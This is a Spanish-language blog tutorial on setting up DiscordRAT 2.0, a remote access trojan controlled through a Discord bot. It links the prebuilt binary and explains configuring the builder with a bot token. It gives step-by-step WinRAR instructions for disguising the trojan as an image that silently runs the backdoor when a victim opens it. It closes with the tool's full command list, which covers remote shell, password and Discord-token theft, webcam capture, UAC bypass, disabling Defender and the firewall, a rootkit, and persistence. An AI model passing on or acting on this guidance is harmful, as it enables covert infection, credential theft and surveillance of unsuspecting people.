---
title: Discord RAT
author: Fuzz3d
date: 2024-06-13
categories: [Blogging, Tutorial, Herramienta]
tags: [discord, rat, hacking]
render_with_liquid: false
---

# Que es un RAT?

Un troyano de acceso remoto (también conocido como RAT, del inglés Remote Access Trojan) es una herramienta que los desarrolladores de malware usan para obtener acceso y control remoto al sistema de un usuario, incluido acceso a su teclado y ratón, así como acceso a sus archivos y recursos de red. 
En lugar de destruir archivos o robar datos, un RAT permite a los atacantes controlar completamente un dispositivo móvil o de sobremesa, lo que les permite explorar aplicaciones y archivos de manera furtiva y evadir las medidas de seguridad típicas, como cortafuegos, sistemas de detección de intrusiones y controles de autenticación.
![Que es un RAT?](https://i0.wp.com/hackwise.mx/wp-content/uploads/2020/01/mejores-rat.jpg?fit=1200%2C650&ssl=1)

# DiscordRAT 2.0
Herramienta de administración remota de Discord completamente escrita en C#.

Este es un RAT controlada sobre Discord con más de 40 módulos de postexplotación.

# Creditos

El creador de la herramienta es un usuraio de GitHub **mom825** y pueden encontrar su perfil aqui junto con la herramienta -> [github.com/moom825](https://github.com/moom825)

# Preparación del RAT

Descargue el binario precompilado desde el siguiente link https://github.com/moom825/Discord-RAT-2.0/releases/tag/2.0

Primero deberá registrar un bot en el portal de desarrolladores de Discord y luego agregar el bot al servidor de Discord que desea usar para controlarlo (asegúrese de que el bot tenga privilegios de administrador en el servidor de Discord). 
Una vez creado el bot, abra "builder.exe", pegue el token del bot y pegue el ID del servidor que ha creado. 
>Si no sabes como crear un bot puedes ir al siguiente post donde se explica de forma detallada la creacion https://www.ionos.com/es-us/digitalguide/servidores/know-how/discord-bot/

![image](https://github.com/Fuzz3d/fuzz3d.github.io/assets/100166954/3493877c-072e-401b-8aab-c26700bd49a7)

# Esconder el Troyano dentro de una imagen

Es obvio que enviar el archivo Client-built.exe a una persona no funcionará de ninguna forma para que lo ejecute, es por eso que podriamos maquillar un poco nuestro rat para esconderlo dentro de una imagen, como hacemos esto
simple, lo que haremos es descargar una imagen cualquiera de internet y con la herramienta Winrar seguiremos estos pasos:
- Seleccionamos el ejecutable Client-built.exe junto con la imagen y le daremos a "Añadir al archivo"
- Debemos activar la opcion "Crear un archivo autoextraible" 
- En el apartado Avanzado > Autoextraible > Instalacion haremos que al extraer los archivos primero se abra la imagen y luego nuestro backdoor
- Dentro de las opciones avanzadas iremos a donde dice "Modos" y seleccionaremos las opciones "Descomprimir en una carpeta temporal" y "Ocultar todo"
- Proximamente lo que haremos será cambiar el icono de nuestro archivo, esto lo haremos dentro de la ventana "Texto e icono" > "Cargar icono desde fichero" es importante antes de realizar este paso convertir nuestra imagen en un archivo ico, esto lo podemos hacer facilmente en una pagina de internet
- Para terminar nos iremos a la ventana "Actualizar" y marcaremos "Extraer y actualizar ficheros" junto con "Sobreescribir todos los ficheros"

Luego, si los pasos anteriores fueron exitosos, puede iniciar el archivo ejecutando su troyano personalizado. Creará un nuevo canal y publicará un mensaje en el servidor con un número de sesión generado.
¡Ahora tu bot debería estar disponible para usar!

![image](https://github.com/Fuzz3d/fuzz3d.github.io/assets/100166954/0a185d8f-428e-46c4-a726-4daa9f7d4c99)

# Comandos 

```
Available commands are :
--> !message = Show a message box displaying your text / Syntax  = "!message example"
--> !shell = Execute a shell command /Syntax  = "!shell whoami"
--> !voice = Make a voice say outloud a custom sentence / Syntax = "!voice test"
--> !admincheck = Check if program has admin privileges
--> !cd = Changes directory
--> !dir = display all items in current dir
--> !download = Download a file from infected computer
--> !upload = Upload file to the infected computer / Syntax = "!upload file.png" (with attachment)
--> !uploadlink = Upload file to the infected computer / Syntax = "!upload link file.png"
--> !delete = deletes a file / Syntax = "!delete / path to / the / file.txt"
--> !write = Type your desired sentence on computer
--> !wallpaper = Change infected computer wallpaper / Syntax = "!wallpaper" (with attachment)
--> !clipboard = Retrieve infected computer clipboard content
--> !idletime = Get the idle time of user's on target computer
--> !currentdir = display the current dir
--> !block = Blocks user's keyboard and mouse / Warning : Admin rights are required
--> !unblock = Unblocks user's keyboard and mouse / Warning : Admin rights are required
--> !screenshot = Get the screenshot of the user's current screen
--> !exit = Exit program
--> !kill = Kill a session or all sessions / Syntax = "!kill session-3" or "!kill all"
--> !uacbypass = attempt to bypass uac to gain admin by using windir and slui
--> !shutdown = shutdown computer
--> !restart = restart computer
--> !logoff = log off current user
--> !bluescreen = BlueScreen PC
--> !datetime = display system date and time
--> !prockill = kill a process by name / syntax = "!kill process"
--> !disabledefender = Disable windows defender(requires admin)
--> !disablefirewall = Disable windows firewall(requires admin)
--> !audio = play a audio file on the target computer / Syntax = "!audio" (with attachment)
--> !critproc = make program a critical process. meaning if its closed the computer will bluescreen(Admin rights are required)
--> !uncritproc = if the process is a critical process it will no longer be a critical process meaning it can be closed without bluescreening(Admin rights are required)
--> !website = open a website on the infected computer / syntax = "!website www.google.com"
--> !disabletaskmgr = disable task manager(Admin rights are required)
--> !enabletaskmgr = enable task manager(if disabled)(Admin rights are required)
--> !startup = add to startup(when computer go on this file starts)
--> !geolocate = Geolocate computer using latitude and longitude of the ip adress with google map / Warning : Geolocating IP adresses is not very precise
--> !listprocess = Get all process's
--> !password = grab all passwords
--> !rootkit = Launch a rootkit (the process will be hidden from taskmgr and you wont be able to see the file)(Admin rights are required)
--> !unrootkit = Remove the rootkit(Admin rights are required)
--> !getcams = Grab the cameras names and their respected selection number
--> !selectcam = Select camera to take a picture out of (default will be camera 1)/ Syntax "!selectcam 1"
--> !webcampic = Take a picture out of the selected webcam
--> !grabtokens = Grab all discord tokens on the current pc
--> !help = This help menu
```
